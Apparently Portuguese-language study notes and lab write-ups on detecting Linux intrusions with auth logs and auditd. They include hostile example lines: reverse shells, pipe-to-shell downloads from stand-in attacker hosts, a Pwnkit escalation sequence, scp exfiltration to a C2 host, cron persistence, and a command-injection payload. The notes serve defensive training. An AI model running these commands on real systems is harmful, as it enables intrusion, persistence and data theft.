    2025-08-21T16:38:47.168117+00:00 thm-vm sshd[18479]: Failed password for invalid user sol from 193.32.162.145 port 46702 ssh2
    2025-08-21T16:38:47.491436+00:00 thm-vm sshd[18479]: Connection closed by invalid user sol 193.32.162.145 port 46702 [preauth]
    2025-08-21T16:41:06.828985+00:00 thm-vm sshd[18495]: Failed password for invalid user roy from 80.94.95.112 port 63189 ssh2
    2025-08-21T16:41:11.599255+00:00 thm-vm sshd[18495]: Failed password for invalid user roy from 80.94.95.112 port 63189 ssh2
    2025-08-21T16:41:15.906661+00:00 thm-vm sshd[18495]: Failed password for invalid user roy from 80.94.95.112 port 63189 ssh2
    2025-08-21T16:41:18.468868+00:00 thm-vm sshd[18495]: Failed password for invalid user roy from 80.94.95.112 port 63189 ssh2
    2025-08-21T16:41:20.881476+00:00 thm-vm sshd[18495]: Failed password for invalid user roy from 80.94.95.112 port 63189 ssh2
    2025-08-21T16:41:21.299912+00:00 thm-vm sshd[18495]: Disconnected from invalid user roy 80.94.95.112 port 63189 [preauth]
    2025-08-21T17:06:23.687748+00:00 thm-vm sshd[18544]: Failed password for invalid user user from 80.94.95.112 port 63350 ssh2
    2025-08-21T17:06:26.887120+00:00 thm-vm sshd[18544]: Failed password for invalid user user from 80.94.95.112 port 63350 ssh2
    2025-08-21T17:06:30.901655+00:00 thm-vm sshd[18544]: Failed password for invalid user user from 80.94.95.112 port 63350 ssh2
    2025-08-21T17:06:33.443041+00:00 thm-vm sshd[18544]: Failed password for invalid user user from 80.94.95.112 port 63350 ssh2
    2025-08-21T17:06:37.120015+00:00 thm-vm sshd[18544]: Failed password for invalid user user from 80.94.95.112 port 63350 ssh2
    2025-08-21T17:06:38.589953+00:00 thm-vm sshd[18544]: Disconnected from invalid user user 80.94.95.112 port 63350 [preauth]
  </details>
  <details>
    <summary>2</summary>
    
    ubuntu@thm-vm:~$ cat auth.log | grep "Accepted password"
    2025-08-21T17:10:08.113644+00:00 thm-vm sshd[16876]: Accepted password for root from 91.224.92.79 port 51555 ssh2
    2026-06-08T14:05:53.610859+00:00 thm-vm sshd[1088]: Accepted password for ubuntu from 10.64.91.229 port 57098 ssh2
  </details>
</details>

### Conclusão
A análise dos logs de autenticação do servidor Linux evidencia que o usuário `ubuntu` realizou sua **primeira conexão via SSH em 22 de outubro de 2024 às 08:28**, utilizando **autenticação por chave pública (SSH key)** e não por senha. Esse método é considerado mais seguro e indica que, inicialmente, o acesso ao ambiente seguia boas práticas de segurança.

Características:

- múltiplos IPs externos
- tentativa de vários usuários (root, sol, roy, user)
- repetição de falhas

Após os acessos:

- Mudanças de senha recorrentes
- Uso de `sudo su` (elevação para root)
- Modificação de arquivos críticos (`bash.bashrc`)
- Acesso a `/etc/logrotate.d` (possível evasão de logs)
- Reinicializações do sistema
- Alteração do hostname

O que indica **Atividade pós-exploração (post-exploitation).** Possíveis objetivos do atacante:

- persistência
- ocultação de rastros
- manutenção de acesso root

A análise dos logs confirma que o ambiente foi alvo de ataques automatizados de força bruta via SSH, seguidos por comprometido efetivo de credenciais. Foi identificado acesso não autorizado à
conta root a partir do IP externo `91.24.92.79`, caracterizando comprometimento crítico do sistema. Adicionalmente, o usuário `ubuntu`, que originalmente utilizava autenticação por chave SSH,
passou a ser acessado via senha a partir do IP `10.64.91.229`, indicando possível vazamento ou reutilização de credenciais. Após os acessos indevidos, foram observados atividades típicas de pós-
exploração, incluindo elevação de priviliégios, modificação de arquivos de configuração e tentativas de manipulação de logs, sugerindo que o atacante buscou manter persistência e ocultar evidências.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Após a invasão o usuário provavelmente começou sua exploração pelo sistema. Normalmente o processo de obter acesso a um sistema é feito por bots e depois um humano realiza o trabalho de exploração. Os comandos mais comuns costumam ser:
<table border=2>
  <tr>
    <td>Sistema operacional e arquivos</td>
    <td>pwd, ls /, env, uname -a (nome e versão do kernel), lsb_release -a (informações sobre a versão do linux),  hostname</td>
  </tr>
  <tr>
    <td>Usuários e grupos</td>
    <td>id (retorna informações sobre o usuário atual), whoami, w (mostra usuários logados e os programas que rodam), last (mostra logins e logouts e reinicializações do sistema) cat /etc/sudoers (mostra o arquivo de configuração do sudo) cat /etc/passwd (mostra dados das contas dos usuários)</td>
  </tr>
  <tr>
    <td>Redes e processos</td>
    <td>ps aux, top, ip a, ip r (tabela de roteamento), arp -a, ss -tnlp (examinar sockets), netstat -tnlp (conexões tcp ativas)</td>
  </tr>
  <tr>
    <td>Nuvem e Sandbox</td>
    <td>systemd-detect-virt, lsmod, uptime, pgrep "<edr-or-sandbox>"</td>
  </tr>
</table>

O comando mais importante para se manter atento é “whoami” já que atacantes sempre o usam ao invadir um sistema, dessa forma, é preciso criar uma regra de detecção para esta regra. Utilizando o auditd, as regras são inseridas em **`/etc/audit/rules.d/audit.rules`** , ativando com **`sudo augenrules --load`**

A sintaxe da regra é:
```
-a always,exit -S execve -S execveat -F exe=/usr/bin/whoami -F key=discovery_user
registra sempre que a chamada de sistema terminar de executar
```

<table>
  <tr>
    <td>Encontrar e roubar dados e credenciais</td>
    <td>history | grep pass, find / -name .env, find /home -name id_rsa</td>
  </tr>
  <tr>
    <td>Verificar se o sistema está disponível para minerar criptomoeda</td>
    <td>cat /proc/cpuinfo, lscpu | grep Model, free -m, top, htop</td>
  </tr>
  <tr>
    <td>Scan de rede para verificar novas vítimas</td>
    <td>ping <ip>, for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done</td>
  </tr>
</table>

Para realizar uma investigação bem sucedida o ideal é criar um process tree, ou seja, identificar os passos tomados por um atacante e construir um cenário. Exemplo: procurar pelo comando “whoami” e ir investigando os processos pai.

hack and forget attacks: trata-se de realizar pequenos ataques para obter ganhos pequenos, podendo, por exemplo, instalar um criptominer, infestar para adicionar em um botnet ou usar o dispositivo como proxy.

ingress tool transfer (definido pelo mitre attack): ferramenta que auxilia a inserção do atacante no sistema alvo. Para isso podem utilizar wget (que faz a instalação de um site da web - `wget [https://github.com/xmrig/[...]/xmrig-x64.tar.gz](https://github.com/xmrig/%5B...%5D/xmrig-x64.tar.gz) -O /tmp/miner.tar.gz` ), curl (faz um request para a página web - `curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"` ) e ssh (faz transferência de arquivo através de scp ou sftp - `scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh` ).

Atacantes irão utilizar ferramentas como scp ou sftp para que suas atividades não entrem nos logs, assim como com FTP ou SMB. Para utilizá-los:

```
scp ./malware.sh ubuntu@thm-vm:/tmp
# e
scp attacker@attack-vm:./malware.sh /tmp
```
Outros locais para manter atenção são logs de rede, eventos em arquivos como temporário, arquivos recém-criados e alertas de antivírus e dispositivos de segurança.

> Investigando

**Cenário:** Detecção de Cadeia de Infecção de Cryptominer em Máquina Virtual (VM)

**Evidência Analisada:** `/home/ubuntu/scenario/audit.log`

Começo procurando por processos que tenham sido bem sucedidos através do comando `ausearch -i -if audit.log | grep "USER_AUTH" | grep "res=success"` já que retorna as tentativas de ips desconhecidos que funcionaram e recebo como resposta:
```
type=USER_AUTH msg=audit(09/11/25 21:13:33.009:2048) : pid=5339 uid=root auid=unset ses=unset subj=unconfined msg='op=PAM:authentication grantors=pam_permit,pam_cap acct=root exe=/usr/sbin/sshd ➡️hostname=45.9.148.125 addr=45.9.148.125 terminal=ssh ➡️res=success'UID="root" AUID="unset" 
type=USER_AUTH msg=audit(09/11/25 21:14:28.464:2181) : pid=5440 uid=root auid=unset ses=unset subj=unconfined msg='op=PAM:authentication grantors=pam_permit,pam_cap acct=root exe=/usr/sbin/sshd hostname=45.9.148.125 addr=45.9.148.125 terminal=ssh res=success'UID="root" AUID="unset"
```
Além disso o atacante enumerou o ambiente através do comando last para descobrir os últimos usuários a realizarem login no sistema. Por último, percebo que o atacante buscou por agentes de segurança, EDRs, que estivessem ativos como ds_agent, falcon ou sentinel, utilizando: ausearch -i -if audit.log | grep -E "ds_agent|falcon|sentinel" e obtive:
```
type=PROCTITLE msg=audit(09/11/25 21:13:37.725:2129) : proctitle=/bin/sh /usr/bin/egrep --color=auto falcon|sentinel|ds_agent 
type=EXECVE msg=audit(09/11/25 21:13:37.725:2129) : argc=4 a0=/bin/sh a1=/usr/bin/egrep a2=--color=auto a3=falcon|sentinel|ds_agent 
type=PROCTITLE msg=audit(09/11/25 21:13:37.726:2130) : proctitle=/bin/sh /usr/bin/egrep --color=auto falcon|sentinel|ds_agent 
type=PROCTITLE msg=audit(09/11/25 21:13:37.727:2131) : proctitle=/bin/sh /usr/bin/egrep --color=auto falcon|sentinel|ds_agent 
type=PROCTITLE msg=audit(09/11/25 21:13:37.727:2132) : proctitle=/bin/sh /usr/bin/egrep --color=auto falcon|sentinel|ds_agent 
type=PROCTITLE msg=audit(09/11/25 21:13:37.727:2133) : proctitle=/bin/sh /usr/bin/egrep --color=auto falcon|sentinel|ds_agent 
type=EXECVE msg=audit(09/11/25 21:13:37.727:2133) : argc=4 a0=grep a1=-E a2=--color=auto a3=falcon|sentinel|ds_agent
```
Após obter acesso o atacante então realizou o download de um arquivo chamado “kernupd” e posso comprovar porque o download foi realizado e descompactado na pasta oculta /tmp/.apt, pacotes de atualização geralmente vêm no formato .deb e não .tar.gz. 
```
type=EXECVE msg=audit(09/11/25 21:14:55.515:2254) : argc=5 ➡️a0=tar ➡️a1=xzf ➡️a2=kernupd.tar.gz ➡️a3=-C ➡️a4=/tmp/.apt
```
Após o download o atacante procura executar o arquivo, primeiro concedendo permissão de execução com chmod +x e executa com nohup /tmp/.apt/kernupd/kernupd , como visto no log:
<details>
  <summary>log</summary>

    ubuntu@thm-vm:~/scenario$ sudo ausearch -i -if audit.log | grep "kernupd"
    type=PROCTITLE msg=audit(09/11/25 21:14:55.515:2254) : ➡️proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
    type=EXECVE msg=audit(09/11/25 21:14:55.515:2254) : argc=5 a0=tar a1=xzf a2=kernupd.tar.gz a3=-C a4=/tmp/.apt 
    type=PROCTITLE msg=audit(09/11/25 21:14:55.517:2255) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
    type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2256) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
    type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2257) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
    type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2258) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
    type=PROCTITLE msg=audit(09/11/25 21:16:03.850:2331) : ➡️proctitle=chmod +x /tmp/.apt/kernupd/kernupd
    type=EXECVE msg=audit(09/11/25 21:16:03.850:2331) : argc=3 a0=chmod a1=+x a2=/tmp/.apt/kernupd/kernupd 
    type=PROCTITLE msg=audit(09/11/25 21:16:08.666:2337) : ➡️proctitle=nohup /tmp/.apt/kernupd/kernupd 
    type=EXECVE msg=audit(09/11/25 21:16:08.666:2337) : argc=2 a0=nohup a1=/tmp/.apt/kernupd/kernupd 
    type=PROCTITLE msg=audit(09/11/25 21:16:08.668:2338) : proctitle=nohup /tmp/.apt/kernupd/kernupd 
    type=EXECVE msg=audit(09/11/25 21:16:08.668:2338) : argc=1 a0=/tmp/.apt/kernupd/kernupd 
    type=SYSCALL msg=audit(09/11/25 21:16:08.668:2338) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7ffe3b636655 a1=0x7ffe3b634550 a2=0x7ffe3b634560 a3=0x8 items=2 ppid=5393 pid=5566 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=39 comm=kernupd exe=/tmp/.apt/kernupd/kernupd subj=unconfined key=exec RCH=x86_64 SYSCALL=execve AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root" 
</details>

Por último, o atacante utilizou o programa de scan, netcat, para identificar os hosts vulneráveis. É possível identificar através do comando sudo ausearch -i -if audit.log | grep -vE "SYSCALL" | grep -w "nc" que retorna:
```
type=EXECVE msg=audit(09/11/25 21:15:20.513:2287) : argc=3 a0=bash a1=-c a2=for ip in ➡️10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done
```
(ou seja, o range de endereços foi: 10.10.12.1-10.10.12.10)

### Conclusão

A análise detalhada do arquivo `audit.log` confirma o comprometimento total da máquina virtual por meio de uma cadeia de infecção bem-sucedida voltada à execução de um cryptominer. O incidente
teve início com a quebra de segurança no serviço SSH, onde o atacante obteve acesso direto como superusuário utilizando o IP externo `45.9.148.125` [audit.log]. Imediatamente após a autenticação
bem-sucedida, técnicas automatizadas de reconhecimento e evasão de defesa foram acionadas para mapear o ambiente [audit.log]. O invasor buscou ativamente pela presença de soluções de segurança e 
EDRs (como CrowdStrike, SentinelOne e Trend Micro) [audit.log] e realizou a enumeração de usuários do sistema, garantindo que suas atividades não fossem mitigadas de forma precoce. [1]Dando 
continuidade ao ataque, o vetor de persistência e ocultação foi consolidado com o download e a descompactação do arquivo `kernupd.tar.gz` dentro do diretório `/tmp/.apt` [audit.log]. Esta escolha
de nomenclatura e localização simula de forma fraudulenta componentes legítimos do gerenciador de pacotes e atualizações do sistema operacional, configurando uma clara tentativa de mascaramento
tático [audit.log]. O binário malicioso recebeu permissões de execução e foi disparado em segundo plano por meio do comando `nohup` (continuar rodando em segundo plano), uma abordagem padrão para
garantir que o processo de mineração continue consumindo os recursos computacionais da VM de forma ininterrupta, mesmo após o encerramento da sessão interativa [audit.log]~. Por fim, as evidências
apontam que o impacto do atauqe não se restringiu à máquina local. Utilizando o servidor comprometido como ponto de apoio, o atacante iniciou uma fase de movimentação lateral na rede interna
[audit.log]. Através de um loop em Bash e do utilitário Netcat, foi realizado um escaneamento focado na porta 22 (SSH) cobrindo a faixa de IPs `10.10.12.1` a `10.10.12.10` [audit.log], com o
objetivo de identificar novos alvos vulneráveis e expandir a infraestrutura de mineração. Diante do controle total obtido pelo invasor em nível de root, a integração do sistema operacional está
completamente violada [audit.log]. A reocmendação de segurança para a remediação imediata envolve o isolamento de rede da VM, o bloqueio do IP de origem, a revogação de credenciais e a 
reconstrução total da instância a partir de uma imagem limpa e segura.

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Após conseguir acesso a um sistema, para facilitar a exploração, agentes de ameaça utilizam reverse shells ou shells reversos TryHackMe Shells Overview e para isso, utilizam algumas estratégias como: 
- `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` → a vítima abre um bash para 10.10.10.10:1337
- `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` → mesma coisa mas através de socat e para o endereço 10.20.20.20:2525
- `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")’` → ou através de python para o endereço 10.30.30.30:80

Reverse shells são considerados críticos porque significam que o atacante já conseguiu acesso ao sistema. São detectados através do auditd.

> Investigando

Acessando a aplicação TryPingMe, posso testar a aplicação com 127.0.0.1 && whoami . A estrutura do comando sendo: end_ip && comando , ou seja, realizo o ping ao definir um endereço porque é o que o input aceita e adiciono um comando através do operador “&”. A saída fica:
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.037 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.043 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.033 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3105ms
rtt min/avg/max/mdev = 0.022/0.033/0.043/0.007 ms
➡️svctrypingme
# outro exemplo:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.085 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.050 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.041 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3051ms
rtt min/avg/max/mdev = 0.032/0.052/0.085/0.020 ms
➡️/opt/trypingme
```
Mesmo assim, atacantes podem ficar presos devido a falta de privilégios e para isso utilizam algumas técnicas como, para acessar como root, exploram um sistema ubuntu não atualizado `uname -a` através da ferramenta Pwnkit `wget http://bad.thm/pwnkit.sh | bash` ou identifica um binário env com `find /bin -perm 4000` e, com isso, obtém acesso à `/bin/env /bin/bash -p` ou lista as chaves ssh `ls /etc/ssh` de um arquivo “ssh-backup-key” não protegido obtendo acesso a um sistema com `ssh root@127.0.0.1 -i ssh-backup-key` . Comandos comuns: https://gtfobins.org/#+suid

O passo-a-passo costuma seguir:
< [!TIP]
< egrep permite procura por termos utilizando expressões regulares

```
# Detecção 1: comandos de descoberta
whoami                                                # Retorna o usuário "www-data"
id; pwd; ls -la; crontab -l                           # Usuário e diretório atual, tarefas agendadas
ps aux | egrep "edr|splunk|elastic"                   # Lista tarefas atuais, procura por edrs executando
uname -r                                              # Retorna a versão antiga 4.4 do kernel

# Detecção 2: download para a pasta temporária
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # donwload do exploit pwnkit
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # compila o exploit pwnkit
chmod +x /tmp/pwnkit                                  # Faz o exploit ficar executável
/tmp/pwnkit                                           # Tenta executar o exploit

# Detecção 3: Exfiltração de dados com scp
whoami                                                # Agora retorna o usuário root
tar czf dump.tar.gz /root /etc/                       # Arquiva dados sensíveis
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltra os dados
```

(Ou seja, se o usuário mudou há algo suspeito)

Algumas formas de persistências são:

1. Cron: forma mais comum, utilizam atividades agendadas incluindo atividades como reboot através de:
   ```
   # A line added by APT29 to /var/spool/cron/<user> to run malware on boot
   @reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
  
   #ou repetir o processo em um intervalo de tempo
   # A simplified command that adds the cron job to /etc/cron.d/root
   echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
   ```
2. Systemd: permite a criação de serviços tendo privilégios root. Geralmente se escondem como um serviço legítimo, mas apontam para um arquivo malicioso:
   ```
   # A simplified content of /lib/systemd/system/cloud-online.service file
    [Unit]
    Description=Initial cloud-online job    # Fake description to mimic a trusted service
    [Service]
    ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trusted file
    ```
Portanto, pastas importantes para se observar incluem: /etc/crontab, /etc/cron.d*, /var/spool/cron/*, /var/spool/crontab/* ,/lib/systemd/system/*, /etc/systemd/system/* ,nano /etc/crontab, crontab -e, systemctl start|enable <service> ou em lugares como → Canonical systemd.unit

> Investigando

Para manter acesso, atacantes podem criar persistência em contas de usuários, geralmente para roubar mais dados com o passar do tempo. Para isso, criam uma conta e a tornam privilegiada e para detectá-la basta criar a árvore de processos da criação do comportamento de tal usuário. Outra forma é através da criação de uma chave ssh que quando armazenada com outras no arquivo “~/.ssh/authorized_keys” (cada usuário possui um desse arquivo), porém é muito difícil reconhecer portanto é preciso investigar a origem e o modo como tal chave foi adicionada. 
Sistemas linux podem ser como um ponto de acesso para outros dispositivos de uma organização e comprometer vários dispositivos de uma vez, agindo como um ransomware, explorando hypervisors.

> Investigando

Após obter acesso inicial ao sistema por meio de uma shell reversa, o invasor passou a executar atividades de reconhecimento para identificar possíveis caminhos para a elevação de privilégios. Como o acesso inicial foi realizado com um usuário de permissões limitadas, tornou-se necessário explorar vulnerabilidades ou configurações inadequadas para obter privilégios administrativos.

Durante a investigação, foram analisados os registros de auditoria do sistema em busca de evidências das ações realizadas pelo atacante após a invasão. A análise concentrou-se na identificação de comandos de reconhecimento, buscas por arquivos sensíveis, exploração de vulnerabilidades locais, obtenção de acesso ao usuário **root** e, por fim, possíveis tentativas de coleta e exfiltração de dados.

O objetivo desta etapa da investigação é reconstruir a sequência de eventos, identificar os mecanismos utilizados para a elevação de privilégios e avaliar o impacto do comprometimento do sistema.

Primeiramente procuro pelo endereço IP que o atacante utilizou para encontrar a senha no arquivo de senhas. Para isso, utilizo o comando `sudo ausearch -i -if audit.log | grep "pass"` e recebo o registro:

<details>
  <summary>log</summary>
  
    type=PROCTITLE msg=audit(09/23/25 14:53:00.821:2134) : proctitle=find . -name *pass* 
    type=EXECVE msg=audit(09/23/25 14:53:00.821:2134) : argc=4 a0=find a1=. a2=-name a3=*pass* 
    type=PROCTITLE msg=audit(09/23/25 14:53:10.724:2136) : ➡️proctitle=grep -iR pass . 
    type=EXECVE msg=audit(09/23/25 14:53:10.724:2136) : argc=4 a0=grep a1=-iR a2=pass a3=. 
</details>

No log, descubro que o comando utilizado foi `grep -iR pass .` já que grep inspeciona dentro dos arquivos ao invés do find que procura por arquivos. 

Investigando o arquivo .env escondido na pasta /opt/trypingme, encontro a senha do root para a aplicação:

```
ubuntu@thm-vm:/opt/trypingme$ cat .env.local
# Run the app from this user
# USER=root
➡️# PASSWORD=nGql1pQkGa

# UPD: The file is no longer used, commented it for now
```
